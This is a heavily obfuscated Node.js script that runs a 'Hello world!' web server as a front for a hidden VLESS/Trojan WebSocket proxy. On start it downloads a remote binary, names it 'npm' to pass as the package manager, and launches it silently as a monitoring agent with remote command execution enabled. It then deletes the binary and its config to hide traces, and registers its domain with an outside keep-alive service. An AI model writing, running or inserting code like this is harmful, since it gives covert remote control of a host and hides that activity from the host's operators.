const _0x27f0ab=_0x2214;function _0x189f(){const _0x5c55c8=['map','url','180636wmpmxg','trojan://','1998409cxpxFe','2053','application/json','catch','readUInt8','Unknown','https://','join','client_secret:\x20','60KfuOpC','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','stream','post','readUInt16BE','from','AUTO_ACCESS','npm\x20is\x20running','npm\x20is\x20already\x20running,\x20skip\x20running...','concat','end','289581FrgzGo','443','66FKZBth','buffer','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','aarch64','every','write','https://api.ip.sb/geoip','Hello\x20world!',':443?encryption=none&security=tls&sni=','crypto','&path=%2F','false','connect','writeHead','Not\x20Found\x0a','npm','/bin/bash','includes','eb5b26ae-b61a-4366-bb91-7d8b2810de66','Server\x20is\x20running\x20on\x20port\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2083','once','digest','toString','slice','error:\x20','close','log','connection','replace','net','NAME','hex','https://amd64.ssss.nyc.mn/v1','env','setsid\x20nohup\x20./npm\x20-s\x20','error','npm\x20download\x20successfully','length','test','1.1.1.1','1234.abc.com','unlink','\x20-p\x20','NEZHA_PORT','reduce','https://amd64.ssss.nyc.mn/agent','then','SUB_PATH','NEZHA_KEY','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','country_code','6624mWNMQV','Failed\x20to\x20resolve\x20','listen','Automatic\x20Access\x20Task\x20added\x20successfully','find','type','Status','\x20with\x20all\x20DNS\x20servers','43269qPUaei','npm\x20running\x20error:','407gGArNd','8.8.4.4','Answer','send','substr','base64','index.html','text/html','message','2KqHCOO','createWriteStream','2691fLEtfa',':443?security=tls&sni=','https://arm64.ssss.nyc.mn/agent','readFile','config.yaml','utf-8','2096','965590CJqiJV','child_process','true','https://oooo.serv00.net/add-url','chmod\x20+x\x20npm','Server','pipe','78340QklYiZ','https://arm64.ssss.nyc.mn/v1','finish','writeFileSync','update','createServer','data','PORT','get'];_0x189f=function(){return _0x5c55c8;};return _0x189f();}(function(_0x1b66e5,_0x2fcf23){const _0x53939a=_0x2214,_0x31119e=_0x1b66e5();while(!![]){try{const _0xc3b243=parseInt(_0x53939a(0x15d))/0x1*(parseInt(_0x53939a(0x1a7))/0x2)+-parseInt(_0x53939a(0x19c))/0x3*(-parseInt(_0x53939a(0x152))/0x4)+-parseInt(_0x53939a(0x13c))/0x5*(-parseInt(_0x53939a(0x15f))/0x6)+-parseInt(_0x53939a(0x149))/0x7+-parseInt(_0x53939a(0x194))/0x8*(-parseInt(_0x53939a(0x1a9))/0x9)+parseInt(_0x53939a(0x1b0))/0xa+parseInt(_0x53939a(0x19e))/0xb*(-parseInt(_0x53939a(0x147))/0xc);if(_0xc3b243===_0x2fcf23)break;else _0x31119e['push'](_0x31119e['shift']());}catch(_0x1b8f07){_0x31119e['push'](_0x31119e['shift']());}}}(_0x189f,0x2bef5));function _0x2214(_0x432cfe,_0x1954cf){_0x432cfe=_0x432cfe-0x137;const _0x189f5f=_0x189f();let _0x221450=_0x189f5f[_0x432cfe];return _0x221450;}const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require(_0x27f0ab(0x17e)),path=require('path'),crypto=require(_0x27f0ab(0x168)),{Buffer}=require(_0x27f0ab(0x160)),{exec,execSync}=require(_0x27f0ab(0x1b1)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x27f0ab(0x182)]['UUID']||_0x27f0ab(0x171),NEZHA_SERVER=process[_0x27f0ab(0x182)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x27f0ab(0x182)][_0x27f0ab(0x18c)]||'',NEZHA_KEY=process['env'][_0x27f0ab(0x191)]||'',DOMAIN=process['env']['DOMAIN']||_0x27f0ab(0x189),AUTO_ACCESS=process[_0x27f0ab(0x182)][_0x27f0ab(0x158)]||!![],WSPATH=process['env']['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x27f0ab(0x182)][_0x27f0ab(0x190)]||'sub001',NAME=process[_0x27f0ab(0x182)][_0x27f0ab(0x17f)]||'',PORT=process[_0x27f0ab(0x182)][_0x27f0ab(0x143)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0xd6430c=_0x27f0ab;try{const _0x37ebd6=await axios[_0xd6430c(0x144)](_0xd6430c(0x165)),_0x1f1dc8=_0x37ebd6['data'];ISP=(_0x1f1dc8[_0xd6430c(0x193)]+'-'+_0x1f1dc8['isp'])[_0xd6430c(0x17d)](/ /g,'_');}catch(_0x231285){ISP=_0xd6430c(0x14e);}};GetISP();const httpServer=http[_0x27f0ab(0x141)]((_0x3b6959,_0x1abd9f)=>{const _0x860759=_0x27f0ab;if(_0x3b6959[_0x860759(0x146)]==='/'){const _0x62eb66=path[_0x860759(0x150)](__dirname,_0x860759(0x1a4));fs[_0x860759(0x1ac)](_0x62eb66,'utf8',(_0x4f05b2,_0x381409)=>{const _0x2b88cb=_0x860759;if(_0x4f05b2){_0x1abd9f['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x1abd9f[_0x2b88cb(0x15c)](_0x2b88cb(0x166));return;}_0x1abd9f[_0x2b88cb(0x16c)](0xc8,{'Content-Type':_0x2b88cb(0x1a5)}),_0x1abd9f['end'](_0x381409);});return;}else{if(_0x3b6959[_0x860759(0x146)]==='/'+SUB_PATH){const _0x532604=NAME?NAME+'-'+ISP:ISP,_0x146c7c='vless://'+UUID+'@'+DOMAIN+_0x860759(0x167)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x532604,_0x294c4e=_0x860759(0x148)+UUID+'@'+DOMAIN+_0x860759(0x1aa)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x860759(0x169)+WSPATH+'#'+_0x532604,_0x555b0d=_0x146c7c+'\x0a'+_0x294c4e,_0x5274b1=Buffer[_0x860759(0x157)](_0x555b0d)['toString'](_0x860759(0x1a3));_0x1abd9f[_0x860759(0x16c)](0xc8,{'Content-Type':'text/plain'}),_0x1abd9f[_0x860759(0x15c)](_0x5274b1+'\x0a');}else _0x1abd9f[_0x860759(0x16c)](0x194,{'Content-Type':'text/plain'}),_0x1abd9f[_0x860759(0x15c)](_0x860759(0x16d));}}),wss=new WebSocket[(_0x27f0ab(0x13a))]({'server':httpServer}),uuid=UUID[_0x27f0ab(0x17d)](/-/g,''),DNS_SERVERS=[_0x27f0ab(0x19f),_0x27f0ab(0x188)];function resolveHost(_0x5c4bd0){return new Promise((_0x4acdba,_0x4184b7)=>{const _0x339005=_0x2214;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x339005(0x187)](_0x5c4bd0)){_0x4acdba(_0x5c4bd0);return;}let _0x273d17=0x0;function _0x102ce6(){const _0xf82038=_0x339005;if(_0x273d17>=DNS_SERVERS[_0xf82038(0x186)]){_0x4184b7(new Error(_0xf82038(0x195)+_0x5c4bd0+_0xf82038(0x19b)));return;}const _0x30b115=DNS_SERVERS[_0x273d17];_0x273d17++;const _0x193091='https://dns.google/resolve?name='+encodeURIComponent(_0x5c4bd0)+'&type=A';axios[_0xf82038(0x144)](_0x193091,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0xf82038(0x18f)](_0x22b919=>{const _0x20bea0=_0xf82038,_0x4136a3=_0x22b919['data'];if(_0x4136a3[_0x20bea0(0x19a)]===0x0&&_0x4136a3[_0x20bea0(0x1a0)]&&_0x4136a3['Answer'][_0x20bea0(0x186)]>0x0){const _0x32cf79=_0x4136a3[_0x20bea0(0x1a0)][_0x20bea0(0x198)](_0x3c72c4=>_0x3c72c4[_0x20bea0(0x199)]===0x1);if(_0x32cf79){_0x4acdba(_0x32cf79[_0x20bea0(0x142)]);return;}}_0x102ce6();})[_0xf82038(0x14c)](_0x51b004=>{_0x102ce6();});}_0x102ce6();});}function handleVlessConnection(_0xe4e175,_0x45250a){const _0x5476d8=_0x27f0ab,[_0x425998]=_0x45250a,_0x1bfe12=_0x45250a[_0x5476d8(0x178)](0x1,0x11);if(!_0x1bfe12[_0x5476d8(0x163)]((_0x1fd7c8,_0x139ca7)=>_0x1fd7c8==parseInt(uuid['substr'](_0x139ca7*0x2,0x2),0x10)))return![];let _0x3a0f92=_0x45250a[_0x5476d8(0x178)](0x11,0x12)[_0x5476d8(0x14d)]()+0x13;const _0x2edb2a=_0x45250a[_0x5476d8(0x178)](_0x3a0f92,_0x3a0f92+=0x2)['readUInt16BE'](0x0),_0x4a812a=_0x45250a['slice'](_0x3a0f92,_0x3a0f92+=0x1)[_0x5476d8(0x14d)](),_0x344ab9=_0x4a812a==0x1?_0x45250a[_0x5476d8(0x178)](_0x3a0f92,_0x3a0f92+=0x4)['join']('.'):_0x4a812a==0x2?new TextDecoder()['decode'](_0x45250a[_0x5476d8(0x178)](_0x3a0f92+0x1,_0x3a0f92+=0x1+_0x45250a[_0x5476d8(0x178)](_0x3a0f92,_0x3a0f92+0x1)['readUInt8']())):_0x4a812a==0x3?_0x45250a[_0x5476d8(0x178)](_0x3a0f92,_0x3a0f92+=0x10)[_0x5476d8(0x18d)]((_0x1623de,_0x25c2f0,_0x4f067a,_0x1323c2)=>_0x4f067a%0x2?_0x1623de[_0x5476d8(0x15b)](_0x1323c2['slice'](_0x4f067a-0x1,_0x4f067a+0x1)):_0x1623de,[])[_0x5476d8(0x145)](_0x272872=>_0x272872['readUInt16BE'](0x0)[_0x5476d8(0x177)](0x10))[_0x5476d8(0x150)](':'):'';_0xe4e175[_0x5476d8(0x1a1)](new Uint8Array([_0x425998,0x0]));const _0x19acba=createWebSocketStream(_0xe4e175);return resolveHost(_0x344ab9)[_0x5476d8(0x18f)](_0x289768=>{const _0x29f686=_0x5476d8;net[_0x29f686(0x16b)]({'host':_0x289768,'port':_0x2edb2a},function(){const _0x407244=_0x29f686;this[_0x407244(0x164)](_0x45250a[_0x407244(0x178)](_0x3a0f92)),_0x19acba['on'](_0x407244(0x184),()=>{})[_0x407244(0x13b)](this)['on'](_0x407244(0x184),()=>{})[_0x407244(0x13b)](_0x19acba);})['on']('error',()=>{});})[_0x5476d8(0x14c)](_0x4c4864=>{const _0x494903=_0x5476d8;net['connect']({'host':_0x344ab9,'port':_0x2edb2a},function(){const _0x10a1f3=_0x2214;this[_0x10a1f3(0x164)](_0x45250a[_0x10a1f3(0x178)](_0x3a0f92)),_0x19acba['on']('error',()=>{})[_0x10a1f3(0x13b)](this)['on']('error',()=>{})[_0x10a1f3(0x13b)](_0x19acba);})['on'](_0x494903(0x184),()=>{});}),!![];}function handleTrojanConnection(_0x5f0540,_0x27535b){const _0x44b07c=_0x27f0ab;try{if(_0x27535b[_0x44b07c(0x186)]<0x3a)return![];const _0x398f23=_0x27535b[_0x44b07c(0x178)](0x0,0x38)[_0x44b07c(0x177)](),_0x16da1f=[UUID];let _0x5bd2e1=null;for(const _0x554c88 of _0x16da1f){const _0x4a6c30=crypto['createHash']('sha224')[_0x44b07c(0x140)](_0x554c88)[_0x44b07c(0x176)](_0x44b07c(0x180));if(_0x4a6c30===_0x398f23){_0x5bd2e1=_0x554c88;break;}}if(!_0x5bd2e1)return![];let _0x49715e=0x38;_0x27535b[_0x49715e]===0xd&&_0x27535b[_0x49715e+0x1]===0xa&&(_0x49715e+=0x2);const _0x1d6089=_0x27535b[_0x49715e];if(_0x1d6089!==0x1)return![];_0x49715e+=0x1;const _0x7439b6=_0x27535b[_0x49715e];_0x49715e+=0x1;let _0x155855,_0x4f3dbf;if(_0x7439b6===0x1)_0x155855=_0x27535b[_0x44b07c(0x178)](_0x49715e,_0x49715e+0x4)[_0x44b07c(0x150)]('.'),_0x49715e+=0x4;else{if(_0x7439b6===0x3){const _0x5da2ed=_0x27535b[_0x49715e];_0x49715e+=0x1,_0x155855=_0x27535b[_0x44b07c(0x178)](_0x49715e,_0x49715e+_0x5da2ed)['toString'](),_0x49715e+=_0x5da2ed;}else{if(_0x7439b6===0x4)_0x155855=_0x27535b[_0x44b07c(0x178)](_0x49715e,_0x49715e+0x10)[_0x44b07c(0x18d)]((_0x4690a5,_0x3c7d4f,_0x2fd94d,_0x416fc1)=>_0x2fd94d%0x2?_0x4690a5[_0x44b07c(0x15b)](_0x416fc1[_0x44b07c(0x178)](_0x2fd94d-0x1,_0x2fd94d+0x1)):_0x4690a5,[])[_0x44b07c(0x145)](_0x5ba8d7=>_0x5ba8d7[_0x44b07c(0x156)](0x0)[_0x44b07c(0x177)](0x10))[_0x44b07c(0x150)](':'),_0x49715e+=0x10;else return![];}}_0x4f3dbf=_0x27535b[_0x44b07c(0x156)](_0x49715e),_0x49715e+=0x2;_0x49715e<_0x27535b[_0x44b07c(0x186)]&&_0x27535b[_0x49715e]===0xd&&_0x27535b[_0x49715e+0x1]===0xa&&(_0x49715e+=0x2);const _0x1b8cb8=createWebSocketStream(_0x5f0540);return resolveHost(_0x155855)[_0x44b07c(0x18f)](_0x21d573=>{const _0x7603c5=_0x44b07c;net[_0x7603c5(0x16b)]({'host':_0x21d573,'port':_0x4f3dbf},function(){const _0x2cfe64=_0x7603c5;_0x49715e<_0x27535b[_0x2cfe64(0x186)]&&this[_0x2cfe64(0x164)](_0x27535b[_0x2cfe64(0x178)](_0x49715e)),_0x1b8cb8['on'](_0x2cfe64(0x184),()=>{})[_0x2cfe64(0x13b)](this)['on'](_0x2cfe64(0x184),()=>{})[_0x2cfe64(0x13b)](_0x1b8cb8);})['on'](_0x7603c5(0x184),()=>{});})[_0x44b07c(0x14c)](_0x507be0=>{const _0x40e20c=_0x44b07c;net[_0x40e20c(0x16b)]({'host':_0x155855,'port':_0x4f3dbf},function(){const _0x8a8a6f=_0x40e20c;_0x49715e<_0x27535b[_0x8a8a6f(0x186)]&&this['write'](_0x27535b[_0x8a8a6f(0x178)](_0x49715e)),_0x1b8cb8['on'](_0x8a8a6f(0x184),()=>{})['pipe'](this)['on']('error',()=>{})[_0x8a8a6f(0x13b)](_0x1b8cb8);})['on'](_0x40e20c(0x184),()=>{});}),!![];}catch(_0x1a14e3){return![];}}wss['on'](_0x27f0ab(0x17c),(_0x334db4,_0x4e7755)=>{const _0x1c364b=_0x27f0ab,_0x102e0b=_0x4e7755['url']||'';_0x334db4[_0x1c364b(0x175)](_0x1c364b(0x1a6),_0x1047fa=>{const _0x190ea1=_0x1c364b;if(_0x1047fa[_0x190ea1(0x186)]>0x11&&_0x1047fa[0x0]===0x0){const _0x3cb8d3=_0x1047fa[_0x190ea1(0x178)](0x1,0x11),_0x2f7202=_0x3cb8d3[_0x190ea1(0x163)]((_0x56c8a2,_0xfd3d99)=>_0x56c8a2==parseInt(uuid[_0x190ea1(0x1a2)](_0xfd3d99*0x2,0x2),0x10));if(_0x2f7202){!handleVlessConnection(_0x334db4,_0x1047fa)&&_0x334db4[_0x190ea1(0x17a)]();return;}}!handleTrojanConnection(_0x334db4,_0x1047fa)&&_0x334db4['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x47bcf8=_0x27f0ab,_0x511395=os['arch']();return _0x511395==='arm'||_0x511395==='arm64'||_0x511395===_0x47bcf8(0x162)?!NEZHA_PORT?_0x47bcf8(0x13d):_0x47bcf8(0x1ab):!NEZHA_PORT?_0x47bcf8(0x181):_0x47bcf8(0x18e);},downloadFile=async()=>{const _0x559dcf=_0x27f0ab;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x235b9e=getDownloadUrl(),_0x40329e=await axios({'method':'get','url':_0x235b9e,'responseType':_0x559dcf(0x154)}),_0x358b02=fs[_0x559dcf(0x1a8)](_0x559dcf(0x16e));return _0x40329e[_0x559dcf(0x142)]['pipe'](_0x358b02),new Promise((_0x39c9a2,_0x435a3a)=>{const _0x54f75a=_0x559dcf;_0x358b02['on'](_0x54f75a(0x13e),()=>{const _0x3478f7=_0x54f75a;console[_0x3478f7(0x17b)](_0x3478f7(0x185)),exec(_0x3478f7(0x139),_0x19a1b3=>{if(_0x19a1b3)_0x435a3a(_0x19a1b3);_0x39c9a2();});}),_0x358b02['on']('error',_0x435a3a);});}catch(_0x50c402){throw _0x50c402;}},runnz=async()=>{const _0x3a5c33=_0x27f0ab;try{const _0xaa74b9=execSync(_0x3a5c33(0x161),{'encoding':_0x3a5c33(0x1ae)});if(_0xaa74b9['trim']()!==''){console[_0x3a5c33(0x17b)](_0x3a5c33(0x15a));return;}}catch(_0x18629d){}await downloadFile();let _0x8b2ba2='',_0x299476=[_0x3a5c33(0x15e),'8443',_0x3a5c33(0x1af),'2087',_0x3a5c33(0x174),_0x3a5c33(0x14a)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x18aae7=_0x299476[_0x3a5c33(0x170)](NEZHA_PORT)?'--tls':'';_0x8b2ba2=_0x3a5c33(0x183)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3a5c33(0x18b)+NEZHA_KEY+'\x20'+_0x18aae7+_0x3a5c33(0x192);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3dd0b1=NEZHA_SERVER[_0x3a5c33(0x170)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x4b555d=_0x299476[_0x3a5c33(0x170)](_0x3dd0b1)?_0x3a5c33(0x137):_0x3a5c33(0x16a),_0x4e6005=_0x3a5c33(0x151)+NEZHA_KEY+_0x3a5c33(0x153)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4b555d+_0x3a5c33(0x173)+UUID;fs[_0x3a5c33(0x13f)](_0x3a5c33(0x1ad),_0x4e6005);}_0x8b2ba2='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x3a5c33(0x17b)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x8b2ba2,{'shell':_0x3a5c33(0x16f)},_0x3563d9=>{const _0x29869f=_0x3a5c33;if(_0x3563d9)console['error'](_0x29869f(0x19d),_0x3563d9);else console[_0x29869f(0x17b)](_0x29869f(0x159));});}catch(_0x19f0e9){console[_0x3a5c33(0x184)](_0x3a5c33(0x179)+_0x19f0e9);}};async function addAccessTask(){const _0x198011=_0x27f0ab;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x22e62c=_0x198011(0x14f)+DOMAIN;try{const _0x5a8c1a=await axios[_0x198011(0x155)](_0x198011(0x138),{'url':_0x22e62c},{'headers':{'Content-Type':_0x198011(0x14b)}});console[_0x198011(0x17b)](_0x198011(0x197));}catch(_0x22545d){}}const delFiles=()=>{const _0x3805d4=_0x27f0ab;fs[_0x3805d4(0x18a)](_0x3805d4(0x16e),()=>{}),fs[_0x3805d4(0x18a)](_0x3805d4(0x1ad),()=>{});};httpServer[_0x27f0ab(0x196)](PORT,()=>{const _0x5c0be3=_0x27f0ab;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x5c0be3(0x172)+PORT);});
